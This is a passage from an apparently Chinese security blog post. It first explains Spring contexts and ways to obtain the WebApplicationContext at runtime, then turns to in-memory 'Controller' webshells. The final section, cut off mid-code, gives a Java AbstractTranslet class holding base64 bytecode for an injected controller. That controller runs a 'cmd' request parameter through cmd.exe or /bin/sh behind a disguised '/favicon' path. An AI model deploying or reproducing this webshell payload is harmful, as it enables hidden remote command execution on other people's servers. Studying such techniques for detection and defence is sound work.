</span></span><span class="line"><span class="cl"><span class="nt">&lt;context:exclude-filter</span> <span class="na">type=</span><span class="s">&#34;annotation&#34;</span> <span class="na">expression=</span><span class="s">&#34;org.springframework.stereotype.Controller&#34;</span><span class="nt">/&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/context:component-scan&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>为自动检测标注Bean。默认情况下<code>&lt;context:component-scan&gt;</code>查找使用构造型注解所标注的类，这些特殊的注解如下：</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">@Component  通用的构造型注解，标识该类为Spring组件（）
</span></span><span class="line"><span class="cl">@Controller  标识将该类定义为Spring MVC controller（控制层）
</span></span><span class="line"><span class="cl">@Repository  标识将该类定义为数据仓库（持久层）
</span></span><span class="line"><span class="cl">@Service 标识将该类定义为服务（服务层，也就是业务层
</span></span></code></pre></td></tr></table></div>
</div>
</div><h3 id="applicationcontext"><a href="#applicationcontext" class="anchor-link">#</a><a href="#contents:applicationcontext" class="headings">ApplicationContext</a></h3>
<p>Spring容器就是ApplicationContext，它是一个接口，有很多实现类。获得了ApplicationContext的实例，就获得了IoC容器的引用。从ApplicationContext中可以根据Bean的ID获取Bean。</p>
<p>Spring还提供另一种IoC容器叫BeanFactory，使用方式和ApplicationContext类似</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">BeanFactory</span> <span class="n">factory</span> <span class="o">=</span> <span class="k">new</span> <span class="n">XmlBeanFactory</span><span class="o">(</span><span class="k">new</span> <span class="n">ClassPathResource</span><span class="o">(</span><span class="s">&#34;application.xml&#34;</span><span class="o">));</span>
</span></span><span class="line"><span class="cl"><span class="n">MailService</span> <span class="n">mailService</span> <span class="o">=</span> <span class="n">factory</span><span class="o">.</span><span class="na">getBean</span><span class="o">(</span><span class="n">MailService</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>BeanFactory和ApplicationContext的区别在于: BeanFactory的实现是按需创建，即第一次获取Bean时才创建这个Bean，而ApplicationContext会一次性创建所有的Bean。实际上ApplicationContext接口是从BeanFactory接口继承而来的。BeanFactory 接口是Spring IoC容器的实际代表者。</p>
<h3 id="contextloaderlistener与dispatcherservlet"><a href="#contextloaderlistener与dispatcherservlet" class="anchor-link">#</a><a href="#contents:contextloaderlistener与dispatcherservlet" class="headings">ContextLoaderListener与DispatcherServlet</a></h3>
<p>一个典型Spring 应用的web.xml 配置示例</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;web-app</span> <span class="na">xmlns:xsi=</span><span class="s">&#34;&lt;http://www.w3.org/2001/XMLSchema-instance&gt;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xmlns=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">xsi:schemaLocation=</span><span class="s">&#34;&lt;http://java.sun.com/xml/ns/javaee&gt; &lt;http://java.sun.com/xml/ns/javaee/web-app_2_5.xsd&gt;&#34;</span>
</span></span><span class="line"><span class="cl">         <span class="na">version=</span><span class="s">&#34;2.5&#34;</span><span class="nt">&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;display-name&gt;</span>HelloSpringMVC<span class="nt">&lt;/display-name&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;listener&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;listener-class&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="nt">&lt;/listener-class&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/listener&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;context-param&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;param-value&gt;</span>/WEB-INF/applicationContext.xml<span class="nt">&lt;/param-value&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/context-param&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>dispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-class&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="nt">&lt;/servlet-class&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;init-param&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;param-name&gt;</span>contextConfigLocation<span class="nt">&lt;/param-name&gt;</span>
</span></span><span class="line"><span class="cl">            <span class="nt">&lt;param-value&gt;</span>/WEB-INF/dispatcherServlet-servlet.xml<span class="nt">&lt;/param-value&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;/init-param&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;load-on-startup&gt;</span>1<span class="nt">&lt;/load-on-startup&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet&gt;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;servlet-name&gt;</span>dispatcherServlet<span class="nt">&lt;/servlet-name&gt;</span>
</span></span><span class="line"><span class="cl">        <span class="nt">&lt;url-pattern&gt;</span>/<span class="nt">&lt;/url-pattern&gt;</span>
</span></span><span class="line"><span class="cl">    <span class="nt">&lt;/servlet-mapping&gt;</span>
</span></span><span class="line"><span class="cl"><span class="nt">&lt;/web-app&gt;</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><ul>
<li>Spring 应用中可以同时有多个 Context，其中只有一个 Root Context，其余都是Child Context。</li>
<li>所有Child Context都可以访问在Root Context中定义的bean，但是Root Context无法访问Child Context中定义的 bean。</li>
<li>所有的Context在创建后，会作为一个属性被添加到了ServletContext中。</li>
</ul>
<p><strong>ContextLoaderListener</strong> 主要被用来初始化全局唯一的Root Context，即Root WebApplicationContext。这个Root WebApplicationContext会和其他Child Context实例共享它的IoC容器，供其他Child Context获取并使用容器中的bean。</p>
<p><strong>DispatcherServlet</strong> 从本质上来讲是一个 Servlet（它继承自HttpServlet）。它的主要作用是处理传入的web请求，根据配置的URL pattern，将请求分发给正确的Controller和View。DispatcherServlet初始化完成后，会创建一个普通的Child Context实例。</p>
<p><strong>综上：</strong> 每个具体的DispatcherServlet创建的是一个Child Context，代表一个独立的IoC容器；而 ContextLoaderListener所创建的是一个Root Context，代表全局唯一的一个公共 IoC 容器。</p>
<p>如果要访问和操作bean，一般要获得当前代码执行环境的IoC 容器（Child Context）代表者ApplicationContext。</p>
<h2 id="获得当前代码运行时上下文环境"><a href="#获得当前代码运行时上下文环境" class="anchor-link">#</a><a href="#contents:获得当前代码运行时上下文环境" class="headings">获得当前代码运行时上下文环境</a></h2>
<ol>
<li>
<p><strong>getCurrentWebApplicationContext</strong></p>
<p>这里获得的是一个XmlWebApplicationContext实例类型的Root WebApplicationContext。</p>
<p><code>WebApplicationContext context = ContextLoader.getCurrentWebApplicationContext();</code>
<img src="/images/image-20211106230151.png" alt=""></p>
</li>
<li>
<p><strong>WebApplicationContextUtils</strong>
此方法获得的也是一个Root WebApplicationContext 。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">WebApplicationContextUtils</span><span class="o">.</span><span class="na">getWebApplicationContext</span><span class="o">(</span><span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">()).</span><span class="na">getServletContext</span><span class="o">());</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>该方法的原型是: <code>public static WebApplicationContext getWebApplicationContext(ServletContext sc)</code> 所以里面的代码是用来获得ServletContext对象。</p>
</li>
<li>
<p><strong>RequestContextUtils</strong>
此方法获取的是名为dispatcherServlet-servlet的Child context。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="n">RequestContextUtils</span><span class="o">.</span><span class="na">findWebApplicationContext</span><span class="o">(((</span><span class="n">ServletRequestAttributes</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">()).</span><span class="na">getRequest</span><span class="o">());</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>函数原型: <code>public static WebApplicationContext getWebApplicationContext(ServletRequest request)</code> （spring 3.1 中<code>findWebApplicationContext</code>要换成<code>getWebApplicationContext</code> ）</p>
<p><img src="/images/image-20211106230256.png" alt=""></p>
<p><code>RequestContextHolder.currentRequestAttributes()</code> 用来获取ServletContext</p>
<p><img src="/images/image-20211106230341.png" alt=""></p>
<p>可见所有的Context在创建后，都会被作为一个属性添加到了ServletContext里的request对象 attributes属性中。</p>
<p>其中<code>org.springframework.web.servlet.DispatcherServlet.CONTEXT</code> 和 <code>org.springframework.web.servlet.DispatcherServlet.THEME_SOURCE</code> 属性名中都存放着一个名叫 <code>dispatcherServlet-servlet</code> 的Child WebApplicationContext 。</p>
</li>
<li>
<p>getAttribute</p>
<p>此方法获取的是名为dispatcherServlet-servlet的Child context。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">WebApplicationContext</span> <span class="n">context</span> <span class="o">=</span> <span class="o">(</span><span class="n">WebApplicationContext</span><span class="o">)</span><span class="n">RequestContextHolder</span><span class="o">.</span><span class="na">currentRequestAttributes</span><span class="o">().</span><span class="na">getAttribute</span><span class="o">(</span><span class="s">&#34;org.springframework.web.servlet.DispatcherServlet.CONTEXT&#34;</span><span class="o">,</span> <span class="n">0</span><span class="o">);</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>其实完全可以将存放在ServletContext属性中的Context取出来直接使用。上面代码中的<code>currentRequestAttributes()</code>替换成<code>getRequestAttributes()</code>也同样有效；getAttribute参数中的0代表从当前request中获取而不是从当前的session中获取属性值。</p>
</li>
<li>
<p>从LiveBeansView属性中获取</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//反射 org.springframework.context.support.LiveBeansView 类 applicationContexts 属性
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">java</span><span class="o">.</span><span class="na">lang</span><span class="o">.</span><span class="na">reflect</span><span class="o">.</span><span class="na">Field</span> <span class="n">filed</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="na">forName</span><span class="o">(</span><span class="s">&#34;org.springframework.context.support.LiveBeansView&#34;</span><span class="o">).</span><span class="na">getDeclaredField</span><span class="o">(</span><span class="s">&#34;applicationContexts&#34;</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//属性被 private 修饰，所以setAccessible true
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">filed</span><span class="o">.</span><span class="na">setAccessible</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">//获取一个 ApplicationContext 实例
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span> <span class="n">context</span> <span class="o">=(</span><span class="n">org</span><span class="o">.</span><span class="na">springframework</span><span class="o">.</span><span class="na">web</span><span class="o">.</span><span class="na">context</span><span class="o">.</span><span class="na">WebApplicationContext</span><span class="o">)</span> <span class="o">((</span><span class="n">java</span><span class="o">.</span><span class="na">util</span><span class="o">.</span><span class="na">LinkedHashSet</span><span class="o">)</span><span class="n">filed</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="kc">null</span><span class="o">)).</span><span class="na">iterator</span><span class="o">().</span><span class="na">next</span><span class="o">();</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><p>因为 org.springframework.context.support.LiveBeansView 类在 spring-context 3.2.x 版本（现在最新版本是 5.3.x）才加入其中，所以比较低版本的 spring 无法通过此方法获得 ApplicationContext 的实例。</p>
</li>
</ol>
<p><strong>推荐使用后面三种方法获得Child WebApplicationContext</strong></p>
<p>在很多应用配置中注册Controller的component-scan组件都配置在类似的dispatcherServlet-servlet.xml中，而不是全局配置文件applicationContext.xml中。这样就导致RequestMappingHandlerMapping的实例bean只存在于Child WebApplicationContext环境中。由于Root Context无法访问Child Context中定义的bean，所以可能会导致1、2方法获取到的Root WebApplicationContext无法获得RequestMappingHandlerMapping的实例bean。</p>
<p>另外在有些Spring 应用逻辑比较简单的情况下，可能没有配置ContextLoaderListener 、也没有类似 applicationContext.xml的全局配置文件，只有简单的servlet配置文件。这时候通过前两种方法是获取不到Root WebApplicationContext（在springboot中也获取不到）。</p>
<h2 id="controller内存马"><a href="#controller内存马" class="anchor-link">#</a><a href="#contents:controller内存马" class="headings">Controller内存马</a></h2>
<p>一个正常的Controller示例代码</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Controller</span>
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">HelloController</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="nd">@RequestMapping</span><span class="o">(</span><span class="n">value</span> <span class="o">=</span> <span class="s">&#34;/hello&#34;</span><span class="o">,</span> <span class="n">method</span> <span class="o">=</span> <span class="n">RequestMethod</span><span class="o">.</span><span class="na">GET</span><span class="o">)</span>
</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="n">String</span> <span class="nf">hello</span><span class="o">(</span><span class="nd">@RequestParam</span><span class="o">(</span><span class="n">value</span><span class="o">=</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">required</span><span class="o">=</span><span class="kc">false</span><span class="o">,</span> <span class="n">defaultValue</span><span class="o">=</span><span class="s">&#34;World&#34;</span><span class="o">)</span> <span class="n">String</span> <span class="n">name</span><span class="o">,</span> <span class="n">Model</span> <span class="n">model</span><span class="o">)</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="n">model</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;name&#34;</span><span class="o">,</span> <span class="n">name</span><span class="o">);</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s">&#34;hello&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">    <span class="o">}</span>
</span></span><span class="line"><span class="cl"><span class="o">}</span>
</span></span></code></pre></td></tr></table></div>
</div>
</div><ol>
<li>Spring 2.5 - Spring 3.1之间使用
org.springframework.web.servlet.mvc.annotation.DefaultAnnotationHandlerMapping映射器。</li>
<li>Spring 3.1 开始及以后使用org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping映射器来支持@Contoller和@RequestMapping注解。</li>
</ol>
<p>当然，也有高版本依旧使用旧映射器的情况。因此正常程序的上下文中一般存在其中一种映射器的实例 bean。又因版本不同和较多的接口等原因，手工注册动态 controller 的方法不止一种。</p>
<p>如下图：Spring 3.2.5中处理 URL 映射相关的类都实现了HandlerMapping 接口。
<img src="/images/image-20211106230430.png" alt=""></p>
<h3 id="注册controller"><a href="#注册controller" class="anchor-link">#</a><a href="#contents:注册controller" class="headings">注册Controller</a></h3>
<ol>
<li>
<p><strong>registerMapping</strong></p>
<p>在Spring 4.0及以后，可以使用registerMapping直接注册requestMapping ，这是最直接的一种方式。</p>
<div class="highlight"><div class="chroma">
<div class="table-container"><table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">com.example.spring</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.DOM</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.TransletException</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.dtm.DTMAxisIterator</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.org.apache.xml.internal.serializer.SerializationHandler</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.WebApplicationContext</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.RequestContextHolder</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.context.request.ServletRequestAttributes</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.PatternsRequestCondition</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.RequestMappingInfo</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping</span><span class="o">;</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">org.springframework.web.servlet.support.RequestContextUtils</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.lang.reflect.Method</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">inject</span> <span class="kd">extends</span> <span class="n">AbstractTranslet</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">    <span class="kd">static</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">className</span> <span class="o">=</span> <span class="s">&#34;com.example.spring.InjectControl&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="c1">//加载com.example.spring.InjectControl类的字节码
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">b64</span> <span class="o">=</span> <span class="s">&#34;yv66vgAAADQAiQoAIQBFCABGCwBHAEgLAEkASggASwgATAoATQBOCgAMAE8IAFAKAAwAUQcAUgcAUwgAVAgAVQoACwBWCABXCABYBwBZCgALAFoKAFsAXAoAEgBdCABeCgASAF8KABIAYAoAEgBhCgASAGIKAGMAZAoAYwBlCgBjAGILAEkAZgcAZwcAaAcAaQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQAiTGNvbS9leGFtcGxlL3NwcmluZy9JbmplY3RDb250cm9sOwEABWxvZ2luAQBSKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTspVgEAAXABABpMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEAAW8BABJMamF2YS9sYW5nL1N0cmluZzsBAAFjAQATTGphdmEvdXRpbC9TY2FubmVyOwEABGFyZzABAAZ3cml0ZXIBABVMamF2YS9pby9QcmludFdyaXRlcjsBAAdyZXF1ZXN0AQAnTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7AQAIcmVzcG9uc2UBAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQANU3RhY2tNYXBUYWJsZQcAUwcAagcAUgcAWQcAZwEAGVJ1bnRpbWVWaXNpYmxlQW5ub3RhdGlvbnMBADhMb3JnL3NwcmluZ2ZyYW1ld29yay93ZWIvYmluZC9hbm5vdGF0aW9uL1JlcXVlc3RNYXBwaW5nOwEABXZhbHVlAQAIL2Zhdmljb24BAApTb3VyY2VGaWxlAQASSW5qZWN0Q29udHJvbC5qYXZhAQArTG9yZy9zcHJpbmdmcmFtZXdvcmsvc3RlcmVvdHlwZS9Db250cm9sbGVyOwwAIgAjAQADY21kBwBrDABsAG0HAG4MAG8AcAEAAAEAB29zLm5hbWUHAHEMAHIAbQwAcwB0AQADd2luDAB1AHYBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIBABBqYXZhL2xhbmcvU3RyaW5nAQAHY21kLmV4ZQEAAi9jDAAiAHcBAAcvYmluL3NoAQACLWMBABFqYXZhL3V0aWwvU2Nhbm5lcgwAeAB5BwB6DAB7AHwMACIAfQEAAlxBDAB+AH8MAIAAgQwAggB0DACDACMHAGoMAIQAhQwAhgAjDACHAIgBABNqYXZhL2xhbmcvRXhjZXB0aW9uAQAgY29tL2V4YW1wbGUvc3ByaW5nL0luamVjdENvbnRyb2wBABBqYXZhL2xhbmcvT2JqZWN0AQATamF2YS9pby9QcmludFdyaXRlcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBAAxnZXRQYXJhbWV0ZXIBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBABYoW0xqYXZhL2xhbmcvU3RyaW5nOylWAQAFc3RhcnQBABUoKUxqYXZhL2xhbmcvUHJvY2VzczsBABFqYXZhL2xhbmcvUHJvY2VzcwEADmdldElucHV0U3RyZWFtAQAXKClMamF2YS9pby9JbnB1dFN0cmVhbTsBABgoTGphdmEvaW8vSW5wdXRTdHJlYW07KVYBAAx1c2VEZWxpbWl0ZXIBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3V0aWwvU2Nhbm5lcjsBAAdoYXNOZXh0AQADKClaAQAEbmV4dAEABWNsb3NlAQAFd3JpdGUBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBAAVmbHVzaAEACXNlbmRFcnJvcgEABChJKVYAIQAgACEAAAAAAAIAAQAiACMAAQAkAAAALwABAAEAAAAFKrcAAbEAAAACACUAAAAGAAEAAAAKACYAAAAMAAEAAAAFACcAKAAAAAEAKQAqAAIAJAAAAagABgAIAAAAsysSArkAAwIATiy5AAQBADoELcYAkxIFOgUSBrgAB7YACBIJtgAKmQAhuwALWQa9AAxZAxINU1kEEg5TWQUtU7cADzoGpwAeuwALWQa9AAxZAxIQU1kEEhFTWQUtU7cADzoGuwASWRkGtgATtgAUtwAVEha2ABc6BxkHtgAYmQALGQe2ABmnAAUZBToFGQe2ABoZBBkFtgAbGQS2ABwZBLYAHacADCwRAZS5AB4CAKcABE6xAAEAAACuALEAHwADACUAAABKABIAAAAOAAkADwARABAAFQARABkAEwApABQARwAWAGIAGAB4ABkAjAAaAJEAGwCYABwAnQAdAKIAHgClAB8ArgAiALEAIQCyACMAJgAAAFwACQBEAAMAKwAsAAYAGQCJAC0ALgAFAGIAQAArACwABgB4ACoALwAwAAcACQClADEALgADABEAnQAyADMABAAAALMAJwAoAAAAAACzADQANQABAAAAswA2ADcAAgA4AAAAKQAI/gBHBwA5BwA6BwA5/AAaBwA7/AAlBwA8QQcAOfgAGvkACEIHAD0AAD4AAAAOAAEAPwABAEBbAAFzAEEAAgBCAAAAAgBDAD4AAAAGAAEARAAA&#34;</span><span class="o">;</span>
</span></span><span class="line"><span class="cl">            <span class="kt">byte</span><span class="o">[]</span> <span class="n">bytes</span> <span class="o">=</span> <span class="n">sun</span><span class="o">.</span><span class="na">misc</span><span class="o">.</span><span class="na">BASE64Decoder</span><span class="o">.</span><span class="na">class</span><span class="o">.</span><span class="na">newInstance</span><span class="o">().</span><span class="na">decodeBuffer</span><span class="o">(</span><span class="n">b64</span><span class="o">);</span>
